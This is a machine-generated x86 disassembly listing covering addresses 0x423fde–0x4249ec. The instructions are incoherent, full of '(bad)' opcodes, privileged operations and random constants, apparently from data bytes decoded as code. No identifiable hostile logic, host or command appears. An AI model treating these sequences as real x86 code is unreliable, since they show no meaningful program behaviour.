  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	aas    
  423fe3:	shr    DWORD PTR [ebx],1
  423fe5:	push   ecx
  423fe6:	add    BYTE PTR [bx+di],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	jl     0x423fd0
  423ff0:	icebp  
  423ff1:	pop    eax
  423ff2:	or     BYTE PTR [esi+0x7e],bh
  423ff5:	jo     0x424073
  423ff7:	mov    dl,BYTE PTR [ebp*1+0x63f86ae7]
  423ffe:	and    BYTE PTR [edi+0x5d],0xdd
  424002:	ins    BYTE PTR es:[edi],dx
  424003:	(bad)  
  424004:	pop    ebx
  424005:	adc    eax,0xea0cda4e
  42400a:	stos   DWORD PTR es:[edi],eax
  42400b:	and    BYTE PTR [edx],0xf4
  42400e:	xor    bh,BYTE PTR [ebp-0x699c40ed]
  424014:	pushf  
  424015:	loope  0x42406b
  424017:	loop   0x424061
  424019:	das    
  42401a:	popf   
  42401b:	cmc    
  42401c:	inc    ebx
  42401d:	leave  
  42401e:	xchg   edx,eax
  42401f:	fisub  DWORD PTR [edx]
  424021:	mov    edx,0x9d9e679a
  424026:	(bad)
  424029:	in     eax,dx
  42402a:	js     0x42408e
  42402c:	jmp    0xcaf1:0xa0b6503a
  424033:	inc    edx
  424034:	cwde   
  424035:	mov    esi,0xb0321ad9
  42403a:	outs   dx,BYTE PTR ds:[esi]
  42403b:	xchg   ecx,eax
  42403c:	sub    esi,edi
  42403e:	add    bl,BYTE PTR [ecx+0x1f81d54c]
  424044:	(bad)  
  424045:	cmp    BYTE PTR [edi-0x43f17a19],bh
  42404b:	gs or  edx,eax
  42404e:	xchg   edx,esp
  424050:	cmp    al,0x79
  424052:	and    ecx,eax
  424054:	pop    edx
  424055:	data16 mov al,0x23
  424058:	iret   
  424059:	or     al,0x7a
  42405b:	cwde   
  42405c:	cs pushf 
  42405e:	push   esp
  42405f:	cmp    DWORD PTR [esi-0x61],esp
  424062:	xchg   edx,eax
  424063:	scas   eax,DWORD PTR es:[edi]
  424064:	aam    0x98
  424066:	push   ebp
  424067:	mov    al,BYTE PTR [edi]
  424069:	add    cl,BYTE PTR [ebp-0x1f]
  42406c:	xchg   esi,eax
  42406d:	aad    0xb4
  42406f:	outs   dx,DWORD PTR ds:[esi]
  424070:	xchg   BYTE PTR [edx*4-0x13fa465f],dh
  424077:	outs   dx,DWORD PTR ds:[esi]
  424078:	fstp   QWORD PTR [ebx]
  42407a:	xor    ch,BYTE PTR [ebx+0x18]
  42407d:	jnp    0x4240c8
  42407f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424080:	test   edi,0xcff199f7
  424086:	fdivr  DWORD PTR [esi+0x39]
  424089:	and    BYTE PTR [edi+0x5fbc231c],dl
  42408f:	in     al,0x2a
  424091:	ins    DWORD PTR es:[edi],dx
  424092:	sub    DWORD PTR [eax],esi
  424094:	int3   
  424095:	add    eax,0xefb996f2
  42409a:	popa   
  42409b:	cmp    ebx,ebx
  42409d:	add    ebp,DWORD PTR [edi+ecx*8+0x42]
  4240a1:	mov    esp,0x90e4387d
  4240a6:	mov    dh,BYTE PTR [ecx]
  4240a8:	fisub  WORD PTR [eax]
  4240aa:	inc    cx
  4240ac:	pop    eax
  4240ad:	dec    ecx
  4240ae:	mov    bl,0x73
  4240b0:	push   eax
  4240b1:	xchg   eax,eax
  4240b3:	push   edx
  4240b4:	pop    ebp
  4240b5:	mov    esp,0xb3c1f96c
  4240ba:	das    
  4240bb:	retf   0x4eb7
  4240be:	or     BYTE PTR [edi],ah
  4240c0:	adc    ecx,DWORD PTR [ebx+0x70]
  4240c3:	dec    ecx
  4240c4:	leave  
  4240c5:	lock jp 0x424074
  4240c8:	test   BYTE PTR [ebp+0x6e9b9e1c],dh
  4240ce:	add    esi,DWORD PTR [edx-0x1762e59f]
  4240d4:	call   ebp
  4240d6:	jb     0x4240e1
  4240d8:	nop
  4240d9:	xchg   ecx,eax
  4240da:	fmul   st,st(4)
  4240dc:	adc    eax,0x21157c20
  4240e2:	or     DWORD PTR [edx-0x75b6c069],edi
  4240e8:	jg     0x424078
  4240ea:	cmp    eax,DWORD PTR [edi+ebp*8+0xeb]
	...
  424155:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424159:	mov    cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	std    
  424163:	mov    eax,ds:0x8367f369
  424168:	add    DWORD PTR [eax],eax
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	leave  
  42416f:	and    DWORD PTR [eax+0x6d1e9e00],0x2469e40
  424179:	aaa    
  42417a:	sub    ecx,ecx
  42417c:	ds in  al,0x71
  42417f:	mov    bh,0x9f
  424181:	iret   
  424182:	outs   dx,BYTE PTR ds:[esi]
  424183:	les    edx,FWORD PTR [edi-0x752a8b6]
  424189:	xchg   edx,eax
  42418a:	pop    ebx
  42418b:	retf   
  42418c:	sbb    BYTE PTR [ebx+0x6a],al
  42418f:	je     0x42418f
  424191:	dec    ebx
  424192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424193:	pop    es
  424194:	stos   BYTE PTR es:[edi],al
  424195:	push   ebx
  424196:	cmp    eax,0xd5c9b6
  42419b:	int    0x8b
  42419d:	sbb    eax,0xe70bd02
  4241a2:	mov    esp,0x9ea035f0
  4241a7:	scas   eax,DWORD PTR es:[edi]
  4241a8:	xor    eax,0x98382c72
  4241ad:	lock es popf 
  4241b0:	sub    eax,0xffffff84
  4241b3:	sub    al,BYTE PTR [ebx]
  4241b5:	(bad)  
  4241b6:	xor    eax,0x956e4f88
  4241bb:	dec    ecx
  4241bc:	dec    esi
  4241bd:	dec    BYTE PTR [ebx-0x1dd2f3e1]
  4241c3:	adc    BYTE PTR [ebx],bl
  4241c5:	sysret 
  4241c7:	inc    edx
  4241c8:	adc    ah,BYTE PTR [edi+ecx*2+0x44db04be]
  4241cf:	xor    eax,0x7e9c8b33
  4241d4:	pop    eax
  4241d5:	jno    0x4241ff
  4241d7:	mov    WORD PTR [ebx+0x69],ss
  4241da:	push   ss
  4241db:	bound  edi,QWORD PTR [esi]
  4241dd:	cwde   
  4241de:	mov    bl,BYTE PTR ds:0x7220f7ca
  4241e4:	int3   
  4241e5:	(bad)  
  4241e6:	mov    DWORD PTR [eax-0x665dc952],edx
  4241ec:	mov    DWORD PTR [edi-0x6e],ecx
  4241ef:	xor    edi,DWORD PTR [edx-0x708ebd80]
  4241f5:	inc    ebx
  4241f6:	xchg   DWORD PTR [edx+0x49],ecx
  4241f9:	mov    bh,0x8
  4241fb:	call   0x99e7962
  424200:	add    BYTE PTR [esi*2-0x1d22ec03],0x8c
  424208:	sub    ebx,DWORD PTR [edi]
  42420a:	pop    ebp
  42420b:	or     al,0xfb
  42420d:	sub    al,0x59
  42420f:	(bad)  
  424211:	lahf   
  424212:	aam    0x55
  424214:	bound  ecx,QWORD PTR [edi-0x1f]
  424217:	xchg   ebp,eax
  424218:	out    dx,eax
  424219:	test   al,0x1b
  42421b:	pop    esp
  42421c:	hlt    
  42421d:	in     al,0x81
  42421f:	enter  0x720b,0xa7
  424223:	mov    cl,BYTE PTR [eax+0x22]
  424226:	cmp    al,0xf0
  424228:	shl    DWORD PTR [ebp-0x4895796d],0xba
  42422f:	mov    eax,ds:0x3068ed99
  424234:	jae    0x4242b5
  424236:	add    al,0xc3
  424238:	mov    dl,0xe6
  42423a:	push   edx
  42423b:	test   DWORD PTR [ecx-0x17cb4e75],ecx
  424241:	pop    si
  424243:	fadd   DWORD PTR [eax+edi*4]
  424246:	les    ebp,FWORD PTR [edx-0xd]
  424249:	xor    DWORD PTR [edi+0x57],0xa69cddf5
  424250:	sbb    DWORD PTR [ecx-0x60],edx
  424253:	sub    edi,edx
  424255:	mov    ah,0xf9
  424257:	xor    al,0x56
  424259:	jp     0x424255
  42425b:	or     bh,bh
  42425d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42425e:	mov    ecx,0xfa643de6
  424263:	add    al,0x3b
  424265:	inc    ecx
  424266:	(bad)  
  424267:	es into 
  424269:	or     BYTE PTR cs:[edi+0x2e86],0x0
	...
  4242d5:	add    BYTE PTR [edi-0x4c275c4c],al
  4242db:	(bad)  
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	mov    cl,0xab
  4242e4:	neg    BYTE PTR [edx+0x18467]
  4242ea:	add    BYTE PTR [ecx],al
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	push   0x45
  4242f0:	xchg   esp,ebx
  4242f2:	lea    ecx,[ecx+eax*8+0x2fcd2abf]
  4242f9:	mov    ds:0x23344c4a,al
  4242fe:	loopne 0x42436e
  424300:	add    DWORD PTR [eax],ebp
  424302:	sbb    DWORD PTR [ebp-0x29dd8011],0xffffffed
  424309:	adc    DWORD PTR [edx+0x3],0xee4e5a94
  424310:	inc    ebp
  424311:	jmp    0x5101ac00
  424316:	mov    DWORD PTR [esi-0x11],ecx
  424319:	shl    DWORD PTR [edx],1
  42431b:	in     eax,0x29
  42431d:	sub    esp,DWORD PTR [ebx+0x3a]
  424320:	jne    0x4242bd
  424322:	pop    esi
  424323:	rol    BYTE PTR [edi],cl
  424325:	iret   
  424326:	cmp    eax,0x3a21f8e2
  42432b:	add    BYTE PTR [eax],0xbb
  42432e:	es rcl edx,1
  424331:	sub    al,0xff
  424333:	xor    DWORD PTR [ecx],eax
  424335:	sbb    eax,0x3ae2abff
  42433a:	pushf  
  42433b:	fist   DWORD PTR [eax-0x4f10e0b3]
  424341:	test   eax,0xb0b98a5b
  424346:	outs   dx,DWORD PTR ds:[esi]
  424347:	inc    esp
  424348:	sar    DWORD PTR [ecx],0x62
  42434b:	cmp    BYTE PTR [eax+edx*4+0x743ded4e],dh
  424352:	cld    
  424353:	out    dx,al
  424354:	mov    ds:0x3eaf0b42,al
  424359:	inc    ebp
  42435a:	mov    esp,0xe49931c8
  42435f:	or     bh,BYTE PTR [esi]
  424361:	push   ebx
  424362:	mov    ds:0xc65e846f,al
  424367:	sub    dh,cl
  424369:	fwait
  42436a:	cmp    al,0xb6
  42436c:	sub    ah,bl
  42436e:	inc    edi
  42436f:	add    al,0x8
  424371:	daa    
  424372:	into   
  424373:	mov    BYTE PTR [edx-0x12],dl
  424376:	fwait
  424377:	adc    dl,BYTE PTR [edi-0x24]
  42437a:	adc    BYTE PTR [ebp+0x4b],0x5e
  42437e:	or     al,0x84
  424380:	das    
  424381:	(bad)  [ecx]
  424383:	cmp    BYTE PTR [ebp+edx*8-0x6cee577a],al
  42438a:	mov    eax,gs
  42438c:	jae    0x42434e
  42438e:	outs   dx,BYTE PTR ds:[esi]
  42438f:	add    BYTE PTR [edx],al
  424391:	out    dx,al
  424392:	xchg   ecx,edi
  424394:	fwait
  424395:	sbb    al,0x27
  424397:	lahf   
  424398:	fstp   QWORD PTR [eax+0x3c5a3221]
  42439e:	in     al,dx
  42439f:	ror    bl,1
  4243a1:	sar    DWORD PTR [ecx-0x2245b074],cl
  4243a7:	xchg   esp,eax
  4243a8:	mov    ds:0x18a196ba,al
  4243ad:	add    BYTE PTR [ebp+0x4ef76575],0xa4
  4243b4:	popa   
  4243b5:	adc    cl,0xb1
  4243b8:	std    
  4243b9:	add    BYTE PTR [edi+0x26926692],cl
  4243bf:	cs xchg ebx,eax
  4243c1:	jmp    0x263a38bf
  4243c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243c7:	inc    eax
  4243c8:	imul   eax,DWORD PTR [esi-0x40906b86],0xe4755005
  4243d2:	fld    TBYTE PTR [edx-0x50470623]
  4243d8:	adc    BYTE PTR [ecx+ecx*1-0x325c3240],dl
  4243df:	push   edx
  4243e0:	xlat   BYTE PTR ds:[ebx]
  4243e1:	adc    al,0x75
  4243e3:	test   al,0xb5
  4243e5:	sub    dl,BYTE PTR [edi-0x60]
  4243e8:	cld    
  4243e9:	les    ebx,FWORD PTR [eax]
  4243eb:	jecxz  0x424466
  4243ed:	adc    DWORD PTR [eax],eax
	...
  424453:	add    BYTE PTR [eax],al
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424452
  424463:	sbb    al,0x94
  424465:	dec    edi
  424466:	test   DWORD PTR [bx+di],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    dh,bl
  42446f:	mov    cs,edi
  424471:	or     bh,cl
  424473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424474:	add    BYTE PTR [edx-0x1],ah
  424477:	pusha  
  424478:	jbe    0x424496
  42447a:	ret    
  42447b:	sub    DWORD PTR [ecx+0x43893e5c],eax
  424481:	pop    edx
  424482:	sub    ecx,DWORD PTR [eax]
  424484:	pop    ss
  424485:	hlt    
  424486:	mov    edx,ecx
  424488:	cmp    bh,BYTE PTR [esi-0x53c089db]
  42448e:	pop    es
  42448f:	mov    bh,0xba
  424491:	xor    DWORD PTR [edi+0x3],ecx
  424494:	adc    eax,0xd109dd58
  424499:	mov    dl,0x79
  42449b:	push   0x1b
  42449d:	adc    DWORD PTR ds:0xf9432d09,eax
  4244a3:	mov    ah,BYTE PTR [ebx]
  4244a5:	iret   
  4244a6:	data16 mov WORD PTR [edi],?
  4244a9:	stos   DWORD PTR es:[edi],eax
  4244aa:	pusha  
  4244ab:	sahf   
  4244ac:	adc    al,0xf0
  4244ae:	xor    al,0xe6
  4244b0:	xchg   ebp,eax
  4244b1:	ror    BYTE PTR [ecx-0x46],1
  4244b4:	sub    DWORD PTR [ebp+0x1e],edx
  4244b7:	retf   0xfae7
  4244ba:	(bad)  
  4244bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244bc:	push   ecx
  4244bd:	sub    eax,edx
  4244bf:	or     dl,BYTE PTR [eax+0x39474308]
  4244c5:	sbb    al,0x1e
  4244c7:	ss cwde 
  4244c9:	cmp    DWORD PTR [ecx+eiz*1-0x39],ebp
  4244cd:	loop   0x42447f
  4244cf:	inc    bx
  4244d1:	pop    esi
  4244d2:	jp     0x42451c
  4244d4:	and    ebx,DWORD PTR [ecx-0x73]
  4244d7:	and    BYTE PTR [esi+eiz*2],ch
  4244da:	leave  
  4244db:	scas   al,BYTE PTR es:[edi]
  4244dc:	mov    bl,0x7a
  4244de:	jo     0x4244b5
  4244e0:	xor    esi,DWORD PTR [edi+0x375fb809]
  4244e6:	bound  eax,QWORD PTR [ecx-0xadd93b3]
  4244ec:	int3   
  4244ed:	xlat   BYTE PTR ds:[ebx]
  4244ee:	mov    bh,0x4f
  4244f0:	in     al,0xbb
  4244f2:	sbb    esi,esi
  4244f4:	cld    
  4244f5:	jns    0x424544
  4244f7:	and    ebp,DWORD PTR [ebx+0x24]
  4244fa:	or     BYTE PTR [ebx],bl
  4244fc:	xchg   esp,eax
  4244fd:	jbe    0x424570
  4244ff:	loop   0x42452a
  424501:	mov    BYTE PTR [ecx-0x35],bl
  424504:	hlt    
  424505:	sti    
  424506:	cmp    al,0x4c
  424508:	and    eax,0x9735d079
  42450d:	scas   al,BYTE PTR es:[edi]
  42450e:	add    DWORD PTR [edi+0x7e],0x683319a2
  424515:	and    al,0xc2
  424517:	jge    0x42449d
  424519:	pop    eax
  42451a:	mov    ds:0xc3cff2be,eax
  42451f:	jo     0x424526
  424521:	cdq    
  424522:	pop    ebp
  424523:	sar    BYTE PTR [ecx-0x39bc98d8],cl
  424529:	push   ebx
  42452a:	adc    ch,dl
  42452c:	add    DWORD PTR [ebx],esp
  42452e:	push   eax
  42452f:	jmp    0xe8c9e6a3
  424534:	inc    esi
  424535:	mov    ecx,0x7d8c1259
  42453a:	push   ebp
  42453b:	cld    
  42453c:	jle    0x4244d8
  42453e:	fs adc dl,ch
  424541:	hlt    
  424542:	dec    si
  424544:	into   
  424545:	or     DWORD PTR [ebx-0x49],ebx
  424548:	iretw  
  42454a:	aad    0x50
  42454c:	(bad)  
  42454d:	in     al,0xbc
  42454f:	xor    BYTE PTR [ecx],ah
  424551:	xor    eax,ebx
  424553:	jecxz  0x42450d
  424555:	imul   eax,DWORD PTR [edx],0xb1fd6a09
  42455b:	sub    eax,0x244fd6f0
  424560:	repnz sbb DWORD PTR [edi+0x3c],eax
  424564:	cmp    al,0xa5
  424566:	mov    edx,0x78c8c1ad
  42456b:	mov    ebx,0x996c
	...
  4245d4:	add    BYTE PTR [eax],al
  4245d6:	loopne 0x424647
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x2],1
  4245e3:	rcl    DWORD PTR [esi+edx*8],1
  4245e6:	xchg   BYTE PTR [bx+di],al
  4245e9:	add    BYTE PTR [eax],al
  4245eb:	add    DWORD PTR [eax],eax
  4245ed:	add    dh,ch
  4245ef:	or     BYTE PTR [ebx-0x4ef3feae],cl
  4245f5:	int    0x7b
  4245f7:	in     al,0xdd
  4245f9:	mov    WORD PTR [eax-0x42],ss
  4245fc:	gs inc ebx
  4245fe:	int    0x59
  424600:	imul   ebp,DWORD PTR [ebp+0x5e],0xb5e620e7
  424607:	cs ret 
  424609:	pop    edi
  42460a:	sub    ebx,DWORD PTR [ecx+0x7c]
  42460d:	sbb    al,ch
  42460f:	shl    ah,1
  424611:	pusha  
  424612:	xchg   DWORD PTR [eax+0x61cdbf05],edx
  424618:	into   
  424619:	pop    ebp
  42461a:	popa   
  42461b:	shl    DWORD PTR [esi+0x41],0x7c
  42461f:	push   edi
  424620:	lds    ecx,FWORD PTR cs:[ebp-0x3e47be3e]
  424627:	out    dx,eax
  424628:	xor    eax,DWORD PTR [eax+0x2c]
  42462b:	stc    
  42462c:	sbb    BYTE PTR [eax+0x1b],ch
  42462f:	mov    bh,0xa6
  424631:	add    cl,BYTE PTR [ebx-0x56]
  424634:	cmp    ah,bl
  424636:	test   al,0xe4
  424638:	fild   WORD PTR [esi+ebp*4+0x102b95a5]
  42463f:	stos   DWORD PTR es:[edi],eax
  424640:	push   ds
  424641:	push   ebx
  424642:	xor    ebp,ebp
  424644:	jae    0x424689
  424646:	add    al,0xa
  424648:	pop    ss
  424649:	push   es
  42464a:	hlt    
  42464b:	mov    edx,DWORD PTR [edx-0x34]
  42464e:	stos   BYTE PTR es:[edi],al
  42464f:	lods   al,BYTE PTR ds:[esi]
  424650:	mov    ds:0x7331fa33,eax
  424655:	sub    bl,BYTE PTR [edi+0x1e709528]
  42465b:	sub    BYTE PTR [ecx+eiz*4+0x65],bh
  42465f:	add    BYTE PTR [edx-0x79609b4e],0x3a
  424666:	into   
  424667:	mov    cl,0xb8
  424669:	or     edx,DWORD PTR [eax]
  42466b:	push   ss
  42466c:	jge    0x424603
  42466e:	pop    edx
  42466f:	inc    ecx
  424670:	retf   0xde99
  424673:	adc    al,0x82
  424675:	sti    
  424676:	outs   dx,BYTE PTR ds:[esi]
  424677:	add    ecx,edi
  424679:	cli    
  42467a:	addr16 sbb al,0xb1
  42467d:	dec    eax
  42467e:	fist   WORD PTR [esi-0x1a2e72e6]
  424684:	clc    
  424685:	sub    al,0x89
  424687:	jne    0x424708
  424689:	xor    DWORD PTR [esi-0x5f],eax
  42468c:	jne    0x424664
  42468e:	or     al,0xda
  424690:	add    dh,ah
  424692:	jge    0x424617
  424694:	cli    
  424695:	push   0x518178d3
  42469a:	and    ebx,edi
  42469c:	js     0x42465e
  42469e:	(bad)  
  42469f:	xor    dl,dl
  4246a1:	and    dh,BYTE PTR [ebp-0x1ba03f40]
  4246a7:	mov    DWORD PTR [eax],ebx
  4246a9:	les    edi,FWORD PTR [edi+0x52]
  4246ac:	aam    0x68
  4246ae:	pop    DWORD PTR [ecx]
  4246b0:	push   edi
  4246b1:	add    DWORD PTR [ecx],0x3c
  4246b4:	adc    edi,ebx
  4246b6:	push   es
  4246b7:	fst    st(7)
  4246b9:	ja     0x424710
  4246bb:	sbb    eax,0xe9787f25
  4246c0:	mov    bl,0xbe
  4246c2:	xor    BYTE PTR cs:[eax],bl
  4246c5:	pop    ss
  4246c6:	pop    esi
  4246c7:	push   eax
  4246c8:	or     dh,BYTE PTR [ebx+esi*8+0x34326c2b]
  4246cf:	outs   dx,DWORD PTR ds:[esi]
  4246d0:	fsubrp st(3),st
  4246d2:	scas   eax,DWORD PTR es:[edi]
  4246d3:	pop    esp
  4246d4:	fs or  edi,esi
  4246d7:	ins    BYTE PTR es:[edi],dx
  4246d8:	dec    ebx
  4246d9:	pop    edx
  4246da:	ss mov ?,esi
  4246dd:	xchg   esp,eax
  4246de:	jns    0x424741
  4246e0:	sub    al,0xad
  4246e2:	nop
  4246e3:	or     al,0xf5
  4246e5:	js     0x4246d3
  4246e7:	pop    edi
  4246e8:	popa   
  4246e9:	inc    esp
  4246ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246eb:	pop    edx
  4246ec:	xchg   DWORD PTR ds:0x0,ecx
	...
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [edi-0x22],al
  424764:	mov    ds:0x1876777,eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [edi-0x53d1577c],dh
  424773:	int3   
  424774:	push   cs
  424775:	popf   
  424776:	cmp    BYTE PTR [esi+ebp*1],0xd1
  42477a:	jb     0x424790
  42477c:	or     DWORD PTR [esi],esi
  42477e:	dec    ecx
  42477f:	xlat   BYTE PTR ds:[ebx]
  424780:	sbb    DWORD PTR [esi-0x723465a4],edx
  424786:	jp     0x42472e
  424788:	or     al,0x15
  42478a:	repz jge 0x424780
  42478d:	push   ebx
  42478e:	lods   al,BYTE PTR ds:[esi]
  42478f:	popf   
  424790:	out    dx,eax
  424791:	mov    ebp,DWORD PTR ds:0x4d4cf732
  424797:	addr16 xchg esi,eax
  424799:	inc    edi
  42479a:	push   ss
  42479b:	icebp  
  42479c:	popf   
  42479d:	ret    
  42479e:	call   0xec9a2f03
  4247a3:	nop
  4247a4:	xlat   BYTE PTR gs:[ebx]
  4247a6:	inc    ecx
  4247a7:	jmp    DWORD PTR [esi]
  4247a9:	dec    ecx
  4247aa:	(bad)  
  4247ab:	inc    ecx
  4247ac:	add    ecx,DWORD PTR [edx+0x5e]
  4247af:	or     bl,0x8d
  4247b2:	jle    0x424819
  4247b4:	ror    esi,0xcc
  4247b7:	jbe    0x424753
  4247b9:	outs   dx,DWORD PTR ds:[esi]
  4247ba:	pop    ss
  4247bb:	or     edx,DWORD PTR [esi-0x690d3575]
  4247c1:	dec    edx
  4247c2:	jo     0x424763
  4247c4:	(bad)  
  4247c5:	push   ebx
  4247c6:	stos   BYTE PTR es:[edi],al
  4247c7:	jbe    0x42477c
  4247c9:	mov    bl,0x96
  4247cb:	enter  0xcef2,0x33
  4247cf:	dec    edi
  4247d0:	and    ch,ch
  4247d2:	push   ss
  4247d3:	cmp    esi,eax
  4247d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247d6:	cwde   
  4247d7:	mov    ds:0xa0012814,eax
  4247dc:	lock ins BYTE PTR es:[edi],dx
  4247de:	adc    al,0x21
  4247e0:	adc    DWORD PTR [esi-0x1a0ba2ed],edi
  4247e6:	or     eax,0x2acf1a3d
  4247eb:	aad    0x87
  4247ed:	cli    
  4247ee:	cld    
  4247ef:	jae    0x424828
  4247f1:	les    ebx,FWORD PTR [esi-0x6b6bff9d]
  4247f7:	pop    edi
  4247f8:	jo     0x424824
  4247fa:	loopne 0x424878
  4247fc:	xor    al,0x9a
  4247fe:	sub    al,bl
  424800:	cwde   
  424801:	mov    ecx,0x40d6a8d5
  424806:	sti    
  424807:	mov    cl,0x1f
  424809:	sahf   
  42480a:	cmp    BYTE PTR [edx-0x5023793e],ah
  424810:	test   DWORD PTR [esi],0xbf0e5d07
  424816:	or     ebp,ecx
  424818:	loopne 0x4247ed
  42481a:	stos   BYTE PTR es:[edi],al
  42481b:	out    dx,eax
  42481c:	cmc    
  42481d:	or     eax,DWORD PTR [edi-0x31]
  424820:	jl     0x424820
  424822:	popa   
  424823:	fwait
  424824:	adc    ebp,esi
  424826:	gs call 0xeb88b47e
  42482c:	fdiv   QWORD PTR [edx+0x7f8e198d]
  424832:	jmp    0x1d37:0x51d68b8a
  424839:	jns    0x424857
  42483b:	lahf   
  42483c:	jno    0x42482f
  42483e:	jno    0x4248a1
  424840:	std    
  424841:	xchg   ebx,eax
  424842:	dec    edx
  424843:	test   BYTE PTR [edi],ah
  424845:	pushf  
  424846:	popf   
  424847:	cwde   
  424848:	or     al,BYTE PTR [ebp-0x1e]
  42484b:	test   edx,0xfd499cff
  424851:	cmp    bl,BYTE PTR ds:0x691eeec9
  424857:	jl     0x4247e7
  424859:	outs   dx,BYTE PTR ds:[esi]
  42485a:	jp     0x4248d9
  42485c:	popa   
  42485d:	inc    esi
  42485e:	sub    dl,BYTE PTR [ebx-0x66]
  424861:	or     cl,BYTE PTR [ebx-0x5]
  424864:	and    ah,BYTE PTR [esi+ebx*2-0x24a65a33]
  42486b:	cmp    eax,0x6a65
	...
  4248d4:	add    BYTE PTR [eax],al
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	cmp    al,0x18
  4248e4:	add    BYTE PTR [edi+0x67],bl
  4248e7:	mov    BYTE PTR [ecx],al
  4248e9:	add    BYTE PTR [eax],al
  4248eb:	add    DWORD PTR [eax],eax
  4248ed:	add    BYTE PTR [ecx],ch
  4248ef:	push   ds
  4248f0:	adc    BYTE PTR fs:[edi-0x75c592a],0x6c
  4248f8:	mov    ch,0x93
  4248fa:	loop   0x424978
  4248fc:	mov    ebp,0xddda1db5
  424901:	adc    eax,0x8b66f347
  424906:	jmp    0x42493d
  424908:	pop    ebx
  424909:	and    al,0xe6
  42490b:	add    BYTE PTR [edx-0x32],ah
  42490e:	bound  edx,QWORD PTR [ecx]
  424910:	xchg   esp,eax
  424911:	aaa    
  424912:	inc    ebx
  424913:	out    dx,eax
  424914:	xchg   edx,eax
  424915:	icebp  
  424916:	enter  0xb1c0,0x19
  42491a:	clc    
  42491b:	lds    ecx,FWORD PTR [esi-0x53]
  42491e:	mov    ecx,0x38f93917
  424923:	push   ds
  424924:	jecxz  0x42492e
  424926:	out    dx,eax
  424927:	les    ebx,FWORD PTR [edi+0x5b]
  42492a:	xor    al,0xa7
  42492c:	inc    esp
  42492d:	daa    
  42492e:	fist   DWORD PTR [esi+0x1416f050]
  424934:	imul   edx,DWORD PTR [eax+0x2b2a7ae5],0xd3319a6e
  42493e:	jp     0x424961
  424940:	adc    al,0xe9
  424942:	adc    eax,0xefa42ed7
  424947:	sti    
  424948:	push   0x22
  42494a:	sar    BYTE PTR [ecx],cl
  42494c:	cmp    cl,BYTE PTR [edi+eiz*2+0x2e466070]
  424953:	or     al,0xc6
  424955:	push   0x46c96fb5
  42495a:	sbb    al,0x5a
  42495c:	push   edi
  42495d:	cmp    edx,DWORD PTR [edi-0x51]
  424960:	pop    esi
  424961:	inc    esi
  424962:	dec    ecx
  424963:	lds    ebx,FWORD PTR [esi-0x4430e8c9]
  424969:	lds    edi,FWORD PTR [edi-0x4a]
  42496c:	sbb    al,0xa7
  42496e:	aam    0xcd
  424970:	xchg   esp,eax
  424971:	adc    dh,BYTE PTR [edx+0xe0627a8]
  424977:	daa    
  424978:	adc    ebx,ebx
  42497a:	iret   
  42497b:	and    eax,0x818247c6
  424980:	scas   al,BYTE PTR es:[edi]
  424981:	push   es
  424982:	xchg   ecx,eax
  424983:	adc    al,0x96
  424985:	push   edi
  424986:	mov    WORD PTR [bx-0x24],ds
  42498a:	add    bl,ch
  42498c:	mov    ah,BYTE PTR [ebp-0x6b]
  42498f:	cs in  al,0xbd
  424992:	scas   al,BYTE PTR es:[edi]
  424993:	or     BYTE PTR [ecx],bh
  424995:	jns    0x424978
  424997:	pop    esp
  424998:	iret   
  424999:	das    
  42499a:	mov    bl,0x68
  42499c:	xchg   esp,eax
  42499d:	cli    
  42499e:	inc    edi
  42499f:	mov    edi,0x157a6926
  4249a4:	xor    DWORD PTR [eax-0xcc16bff],esi
  4249aa:	sub    DWORD PTR [ecx+0x432bd6d4],esi
  4249b0:	leave  
  4249b1:	sbb    BYTE PTR [edx+0x2f],ch
  4249b4:	dec    esp
  4249b5:	gs adc eax,0x80bc9174
  4249bb:	jecxz  0x424985
  4249bd:	test   al,0xc9
  4249bf:	lahf   
  4249c0:	mov    dh,0x4c
  4249c2:	fadd   QWORD PTR [edx+0x7293b3db]
  4249c8:	aad    0xd2
  4249ca:	fmul   QWORD PTR [esp+ecx*1+0x2c]
  4249ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249cf:	out    dx,eax
  4249d0:	xchg   edi,esp
  4249d2:	inc    ecx
  4249d3:	int3   
  4249d4:	sub    al,BYTE PTR [ebp+0x2a6e9731]
  4249da:	mov    al,0xd2
  4249dc:	mov    cl,0x4b
  4249de:	ret    
  4249df:	in     eax,0xf9
  4249e1:	fsub   st(3),st
  4249e3:	enter  0xb950,0xe1
  4249e7:	cdq    
  4249e8:	popf   
  4249e9:	sub    al,0xfd
  4249eb:	pop    ss
  4249ec:	std    
